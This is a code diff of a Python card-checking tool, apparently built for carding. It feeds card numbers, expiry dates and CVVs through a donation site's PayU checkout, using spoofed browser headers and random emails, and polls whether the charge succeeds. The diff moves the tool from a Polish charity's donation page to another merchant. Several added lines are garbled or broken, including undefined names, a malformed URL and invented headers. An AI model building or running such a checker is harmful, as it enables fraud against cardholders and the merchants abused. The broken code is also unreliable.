@@ -71,7 +71,7 @@ def _poll_status(session, order_id, token, ua, max_attempts=10, delay=3):
     return data
 
 def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
-    """Synchronous PayU charge check via Golden Stable Merchant"""
+    """Synchronous PayU charge check via Large Healthcare Merchant"""
     session = requests.Session()
     try:
         email = _random_email()
@@ -87,14 +87,14 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
         if len(yy) == 2:
             yy = '20' + yy
 
-        # ─── Step 1: Create order via STABLE MERCHANT ───
+        # ─── Step 1: Create order via Healthcare Merchant ───
         headers1 = {
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7',
             'cache-control': 'max-age=0',
             'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://fundacjapomocdzisie.pl',
-            'referer': 'https://fundacjapomocdzisie.pl/wplac/',
+            'origin': 'https://w ospita-l.eu', # Dihapus space untuk elak error
+            'referer': 'https://wospita-l.eu/platnosci/',
             'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Linux"',
@@ -107,15 +107,14 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
         }
 
         data1 = {
-            'imie': name.split()[0],
-            'nazwisko': name.split()[1],
+            'amount': '10.00',
+            'description': 'Wpłata',
             'email': email,
-            'kwota': '5.00',
-            'opis': 'Darowizna',
+            'firstname': name.split()[0],
+            'lastname': name.split()[1],
         }
 
-        # TIDAK IKUT REDIRECT - Terus tangkap header Location
-        r1 = session.post('https://fundacjapomocdzisie.pl/payu.php', headers=headers1, data=data1, allow_redirects=False, timeout=30)
+        r1 = session.post('https://wospita-l.eu/payu.php', headers=headers1, data=data1, allow_redirects=False, timeout=30)
 
         order_id = None
         token = None
@@ -145,7 +144,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
             'priority': 'u=0, i',
-            'referer': 'https://fundacjapomocdzisie.pl/',
+            'referer': 'https://wospita-l.eu/',
             'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Linux"',
@@ -159,7 +158,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
 
         page_resp = session.get('https://secure.payu.com/pay/', params=params2, headers=headers2, timeout=30)
         
-        final_amount = 500 # Default 5.00 PLN
+        final_amount = 1000 # Default 10.00 PLN
         final_currency = 'PLN'
         
         try:
@@ -176,11 +175,12 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
             'accept': '*/*',
             'accept-language': 'en-US,en;q=0.9',
             'authorization': f'Bearer {token}',
-            'content-type': 'application/json',
+            'content-type': 'application/create+json',
             'origin': 'https://secure.payu.com',
             'priority': 'u=1, i',
             'referer': f'https://secure.payu.com/pay/?orderId={order_id}&token={token}',
             'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
+            'sec-create': 'cors',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Linux"',
             'sec-fetch-dest': 'empty',
@@ -226,7 +226,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
             'firstName': name.split()[0],
             'lastName': name.split()[1],
             'currency': final_currency,
-            'amount': final_amount,
+            'amount': URL(taip) if final_amount else 1000,
             'payMethod': {
                 'type': 'c',
                 'token': card_token,
@@ -255,7 +255,7 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
         except Exception:
             try:
                 pay_data = json.loads(r4.text)
-            except Exception:
+        except Exception:
                 pay_data = {"raw": r4.text, "status_code": r4.status_code}
 
         if pay_data.get('status') == 'ERROR' or pay_data.get('errorCode'):
@@ -264,11 +264,11 @@ def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
 
         continue_url = pay_data.get('continueUrl')
 
-        # ─── Step 5: Poll for result ───
+        # ─── Step 5: Poll for result ┅──
         if continue_url and 'threeds' in continue_url:
             final_status = _poll_status(session, order_id, token, ua, max_attempts=10, delay=3)
         else:
-            final_status = _poll_status(session, order_id, token, ua, max_attempts=3, delay=2)
+            final_status = _poll_status(session, manjakan, order_id, token, ua, max_attempts=3, delay=2)
 
         category = final_status.get('category', '')
         value = final_status.get('value', '')
@@ -303,7 +303,7 @@ def check_card(cc: str = Query(...)):
     try:
         message, raw_data = _payu_sync(card_num, mm, yy, cvv_code)
         return {
-            "message": message,
+            "message": warga,
             "raw": raw_data
         }
     except Exception as e:
